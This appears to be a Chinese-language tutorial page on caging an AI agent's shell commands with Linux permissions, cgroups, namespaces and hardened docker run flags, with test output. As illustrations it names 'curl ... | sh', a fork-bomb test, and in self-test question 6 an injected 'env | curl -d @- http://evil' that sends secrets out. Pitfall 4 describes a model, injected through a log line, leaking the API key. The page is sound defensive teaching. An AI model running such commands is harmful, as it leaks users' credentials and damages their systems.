给 agent 的命令造个笼子：Linux 进程、权限与容器隔离

模型提议的命令，最后是你机器上的一个子进程；默认它和 agent 同一个用户，你能读写的它都能读写，你能连的网它都能连。把它关进笼子靠四样 Linux 机制叠起来：用户和权限（它是谁）、资源限制（能用多少）、namespace（看得见什么）、容器的其他加固（只读根、去掉特权能力）。docker run 只是一次把它们全打开的快捷方式。

①为什么需要：工具一旦能跑命令，模型就握着你的 shell

值班助手 v1 的工具都是写死的 Python 函数，参数只能是关键字和时间。可迟早会有人想加一个 run_command：查个 df -h、grep 一下日志、ss -s 看连接数。这时模型写的字符串会变成真的进程，而模型可能被日志里的一句话带偏（工具怎么设计 · 反例 5）。要回答的问题是：这个进程最坏能做什么，怎么让“最坏”变得很小。

②没有它会怎样：一个普通子进程能做的事

试一下普通子进程（和 agent 同一个用户）
读你的家目录能：ls ~ 列出 backup、claude、documents
写你的家目录能：touch ~/agent-was-here 成功
连外网能：curl https://example.com 返回 HTTP 200
读 /etc/shadow不能：Permission denied，但这只因为普通用户本来就不能

实测 2026-11-24，⑤ 程序的第 1 层，Ubuntu 22.04。

不懂精华时的典型误用：用字符串黑名单拦危险命令，比如禁掉 rm。find . -delete、python3 -c "import shutil; ..."、curl ... | sh 都能做同样的事。拦字符串是在猜攻击者会怎么写；隔离是不管它怎么写，内核都不让它够得着。

本页讲到容器为止：值班助手跑的是“你自己写的白名单命令 + 模型填的参数”，容器的隔离够用、0.3 秒的开销也付得起。要跑模型自己写的任意代码，再往虚拟机那一级走（Claude 的代码执行工具就是在 Anthropic 托管的容器里跑的）。

④原理：四层机制，各管一件事

先知道这些
  • 进程带着身份运行：每个进程有 uid / gid，内核在每次 open、write、connect 时拿它来判权限。
  • fork + exec 会继承：子进程默认继承父进程的 uid、环境变量、打开的文件、工作目录。
  • 信号和退出码：被 SIGKILL 杀掉退出码是 137（128+9），timeout 超时退出码是 124。见 Linux 信号、启动脚本、配置和密钥。

机制 1 · 用户和权限：它是谁

换一个低权限用户运行（nobody，uid 65534），它就碰不到你的文件：家目录是 750，nobody 连列目录都不行（实测）。root 的特权在内核里被拆成 40 来项“能力”（capabilities），比如 CAP_NET_ADMIN 改网络、CAP_SYS_ADMIN 一大堆管理操作；容器里可以一项不留（--cap-drop ALL）。no-new-privileges 再堵上一条路：进程不能靠执行 setuid 程序（比如 sudo）重新拿到特权。

机制 2 · 资源限制：能用多少

  • 时间：timeout 2 cmd 到点发 SIGTERM，退出码 124；Python 里是 subprocess.run(..., timeout=2)。
  • 单进程的上限 rlimit：ulimit / prlimit，比如地址空间 --as、进程数 --nproc、CPU 秒数 --cpu。它是“每个进程”的，子进程各算各的。
  • 一组进程的总量 cgroup：内核把一组进程放进一个 cgroup，限 memory.max、pids.max、cpu.max。超内存时内核的 OOM killer 发 SIGKILL，退出码 137。容器的 --memory、--pids-limit、--cpus 就是在设这几个文件。

Java 比方：-Xmx 管的是 JVM 自己的堆，像 rlimit 只管自己；容器的内存上限像给整台机器装了个闸，JVM 堆外、子进程都算在里面，所以 Java 进程在容器里也会 137（requests、limits 和探针那页讲过）。

机制 3 · namespace：看得见什么

namespace 不是限制“能做什么”，而是改变“看见的世界”：同一个内核，给这组进程一份独立的视图。常用的几种：

MNT挂载点：可以给它一份只含必要目录的文件系统容器的根目录就是这样来的
USERuid 映射：里面的 root 映射到外面的普通用户里面 id -u 是 0，可读 /etc/shadow 照样被拒；写家目录却能成功，因为外面看它就是你

为什么这样设计：共享内核、按需叠加

Linux 的做法：几样独立的机制，按需组合

  • 每样只管一件事（身份、额度、视图、特权），可以单独用：只想限时间就 timeout，只想断网就一个 NET namespace。
  • 都在同一个内核里，开销极小：namespace 不到 10 毫秒，整套容器 0.3 秒（实测）。
  • 代价：组合要你自己配，漏掉一层就留一个洞（容器不管时间，实测“永远不退出”照样能）；而且所有进程共享一个内核，内核有漏洞就可能逃出去。

另一种：每个任务一台虚拟机

  • 连内核都隔开，逃逸难得多；跑完全不可信的代码时选它（gVisor、Firecracker 这类就是为此做轻的）。
  • 启动和内存开销大得多；值班助手几秒一次的只读命令用不着。
决定胜负的约束：值班助手要隔离的是“你写的白名单命令 + 模型填的参数”，而且一次排查要跑好几次。共享内核的容器在隔离强度和开销之间正好；真要跑模型自己写的任意代码，就往虚拟机那一级走。

最少的写法

一条够用的 docker run每个参数管什么，见 ⑥
docker run --rm \
  --network none \                       # NET：断网
  --read-only --tmpfs /tmp:size=16m \    # MNT：根目录只读，只给一小块临时目录
  -v /var/log/order-svc:/logs:ro \       # 只把要读的日志只读挂进去
  --user 65534:65534 \                   # 用户：nobody
  --cap-drop ALL --security-opt no-new-privileges \
  --pids-limit 20 --memory 32m --memory-swap 32m --cpus 0.5 \   # cgroup：进程数、内存、CPU
  alpine:3.20 grep -c ERROR /logs/app.log

外面再套一层时间：subprocess.run(cmd, timeout=20)。注意超时只杀得掉 docker 客户端进程，容器要配合 --name 和 docker kill 才停得干净（⑥ 坑 5）。

⑤亲眼看到：四层笼子，每层跑几条命令

一个 Python 脚本，按层跑十几条 shell 命令，打印退出码和输出的第一行。第 3 层全程不用 sudo；第 4 层要 docker 和 alpine:3.20（8.8 MB）。

⑤linux-process-isolation/main.py（节选）完整代码 →
DOCKER = ("sudo docker run --rm --network none --read-only --user 65534:65534 --cap-drop ALL "
          "--security-opt no-new-privileges --pids-limit 20 --memory 32m --memory-swap 32m alpine:3.20")
LAYERS = {
    2: ("资源限制", [("超时", "timeout 2 sleep 10"),
                    ("内存", "prlimit --as=200000000 python3 -c 'b = bytearray(500_000_000)'"),
                    ("换用户", "sudo -n -u nobody touch $HOME/x")]),
    3: ("namespace", [("PID", "unshare --user --map-root-user --pid --fork --mount-proc ps -e"),
                      ("NET", "unshare --user --map-root-user --net sh -c 'ip -brief link; curl ...'"),
                      ("USER", "unshare --user --map-root-user sh -c 'id -u; cat /etc/shadow'")]),
    4: ("容器", [("fork 炸弹", f"{DOCKER} sh -c 'for i in $(seq 40); do sleep 3 & done; wait'"),
                 ("吃内存", f"{DOCKER} sh -c 'head -c 200m /dev/zero | tail > /dev/null'"), ...]),
}
  1. 1 准备Linux；sudo docker pull alpine:3.20。
  2. 2 跑cd agent && python3 linux-process-isolation/main.py，只看一层加 --layer 3。不需要 uv，也不需要模型。
实测运行输出（节选）2026-11-24 · Ubuntu 22.04 · 内核 6.8 · Docker 27.3
第 2 层 · 资源限制：timeout、prlimit（ulimit）
   $ timeout 2 sleep 10                                       退出码 124
   $ prlimit --as=200000000 python3 -c 'b = bytearray(...)'   退出码 1  MemoryError
   $ sudo -n -u nobody touch $HOME/x                          退出码 1  touch: cannot touch '/home/ubuntu/x': Permission denied

第 3 层 · namespace：看到的世界变小（不需要 root）
   $ unshare ... --pid --fork --mount-proc ps -e              退出码 0  PID TTY TIME CMD / 1 ? 00:00:00 ps
   $ unshare ... --net sh -c 'ip -brief link; curl ...'       退出码 0  lo DOWN / 连不上
   $ unshare --user --map-root-user sh -c 'id -u; cat ...'    退出码 1  0 / cat: /etc/shadow: Permission denied

第 4 层 · 容器：namespace + cgroup + 只读根 + 去能力，一条 docker run
 · 身份是 nobody         退出码 0    uid=65534(nobody) gid=65534(nobody)
 · 断网                  退出码 0    联网失败
 · 根目录只读            退出码 1    touch: /x: Read-only file system
 · 进程数上限 20         退出码 2    sh: can't fork: Resource temporarily unavailable
 · 内存上限 32 MB        退出码 137  Killed

启动开销：docker run --rm alpine true 三次 0.37 / 0.28 / 0.29 s；unshare 三次都 < 0.01 s
读出来的结论
  • 每一层都拦住了它负责的那几样，也只拦住那几样：namespace 断了网、藏起了别的进程，却管不了内存和时间。
  • user namespace 里 id -u 是 0，读 /etc/shadow 照样被拒；同样的命令去写家目录却成功了，在外面看那个文件属于 ubuntu。“容器里的 root”不等于宿主的 root，但也不等于“什么都做不了”。
  • 容器的 137 和 timeout 的 124 是两种不同的死法：前者是 cgroup 的 OOM killer 发的 SIGKILL，后者是到点发的 SIGTERM。看退出码就知道是哪道闸拦的。
  • 容器本身不限时间：要靠外面的超时。
到这里已经能交差了：一条带齐参数的 docker run + 外面一层超时，就是一个够用的命令笼子。
已知还没处理的细节：容器默认是 root（坑 1）；环境变量里的密钥（坑 4）；超时杀不干净（坑 5）。

⑥细节：容器参数一个配错，笼子就有洞

第一圈 · 注意事项

1不写 --user，容器里就是 root← ④ 机制 1
现象
容器里能改它看得到的一切文件，包括可写挂载进来的目录。
根源
大多数镜像默认以 uid 0 运行；没开 user namespace 重映射时，它就是宿主的 uid 0，只是能力被裁过一部分。
做法
总是 --user 65534:65534（或镜像里建专用用户），配 --cap-drop ALL 和 no-new-privileges。
2挂了 docker.sock 或加了 --privileged← ④ 机制 1
现象
“为了方便在容器里看别的容器”，把 /var/run/docker.sock 挂进去；或者图省事加 --privileged。
根源
能访问 docker.sock 就能起一个挂载宿主根目录的特权容器，等于宿主 root；--privileged 把能力和设备全放开，前面几层白做。
做法
沙箱容器永远不挂 docker.sock、不加 --privileged；需要的信息由宿主上的你的代码查好，再作为参数或只读文件给进去。
3挂载目录忘了 :ro← ④ 机制 3
现象
根目录是只读的，-v /var/log/order-svc:/logs 却是可写的，日志被改了或删了。
根源
--read-only 只管容器自己的根文件系统，挂进来的卷按挂载参数来。
做法
只挂要读的那几个目录，一律加 :ro；要写只给 --tmpfs /tmp:size=16m。
4子进程继承了 ANTHROPIC_API_KEY← ④ 先知道
现象
模型被注入后执行 env，回执里出现了你的 API key，它又被写进了对话日志。
根源
fork + exec 默认继承全部环境变量；agent 进程里恰好有密钥。
做法
subprocess.run(..., env={"PATH": "/usr/bin:/bin"}) 只给最少的变量；容器只用 -e 显式传需要的。密钥怎么管见 配置和密钥。
5超时只杀了外层，里面的还在跑← ④ 机制 2
现象
subprocess.run("...", shell=True, timeout=20) 超时返回了，ps 一看命令还在跑；或者 docker run 的客户端被杀了，容器还活着。
根源
超时后 Python 只杀它直接启动的那个进程（shell 或 docker 客户端），孙进程和容器不在它手里。
做法
start_new_session=True 让命令自成一个进程组，超时用 os.killpg 整组杀；容器起名 --name sb-xxx，超时后 docker kill sb-xxx。
6只限了内存，没限进程数和 CPU← ④ 机制 2
现象
内存守住了，fork 炸弹或者一个死循环把宿主两个核吃满，值班助手自己也卡住了。
根源
cgroup 的每一项是独立的，不设就是不限。
做法
--memory、--memory-swap（等于内存，禁止换出）、--pids-limit、--cpus 四个一起写。

第二圈 · 使用规范

  • 沙箱参数写成一个函数，不在各处拼字符串：防某个调用点漏了 --network none。
  • 默认全关，需要什么开什么：要读日志就只读挂日志目录，要访问一个内部接口就单独给一个只通那个地址的网络；防“先全开再慢慢收”。
  • 记录每次沙箱执行：命令、退出码、耗时、被哪道闸拦：防出了事查不清；退出码 124、137 本身就是线索。
  • 镜像固定版本、尽量小：防镜像里自带一堆用不上的工具（curl、编译器），等于给了攻击者工具箱。

第三圈 · 深处

seccomp：连系统调用都管

Docker 默认带一份 seccomp 配置，挡掉几十个容器里用不着、又危险的系统调用（比如加载内核模块、改时钟）。可以再写更严的白名单，只放行命令真正要用的那些。它是“共享内核”这个弱点上的又一层补丁。

rootless 和 user namespace 重映射

Docker 可以让容器里的 root 映射到宿主上一个没有权限的 uid（userns-remap，或者整个 Docker 以普通用户运行）。这样就算容器被攻破、拿到了“root”，到了宿主也只是个普通用户，正是 ⑤ 第 3 层看到的效果。

自测

1. 用一句话说出这一页的精华

子进程默认继承 agent 的一切；用户和权限、资源限制、namespace、容器加固四层各管一件事，叠起来再加超时，才是一个没有明显洞的笼子。

2. 为什么黑名单拦命令不算隔离？

它在猜攻击者怎么写，换个写法就过去；隔离靠内核判权限、限额度、改视图，不管命令怎么写都够不着。

3. 容器里 uid 是 0，算不算宿主的 root？

看配置：没开 user namespace 重映射时，它就是宿主的 uid 0，只是被裁了能力；开了的话（像 ⑤ 第 3 层），它映射到宿主的普通用户。

从 ④ 机制 1、3 推出。

4. 预测：只用 unshare --net --pid，不限内存，命令 python3 -c "x=' '*10**10" 会怎样？

namespace 不管资源，它会一直申请内存，直到撞上宿主的内存上限，可能把宿主上的其他进程（包括 agent 自己）一起拖慢或被 OOM 杀掉。

从 ④ 机制 4 的分层表推出。

5. 预测：容器跑 sleep 3600，加了 --memory 和 --pids-limit，它多久结束？

一小时：容器不限时间。要外面的超时，而且要能杀掉容器本身（坑 5）。

6. 放回全景：第 6 站的命令被注入成 env | curl -d @- http://evil，哪几层分别能拦？

环境变量清掉（坑 4）让 env 里没有密钥；--network none 让 curl 连不出去；更前面还有下一页的命令白名单根本不放行 env 和 curl，以及审批。多层里任何一层守住都能挡住这次。

档位：标准。本机跑过（2026-11-24，Ubuntu 22.04.5，内核 6.8.0，Docker 27.3.1，alpine:3.20）：⑤ 的四层全部命令、user namespace 里写家目录的文件归属、容器和 unshare 的启动耗时。按文档和常识（没有在本页实测）：Docker 默认 seccomp 配置、userns-remap、超时只杀直接子进程的行为、gVisor 和 Firecracker 的定位。
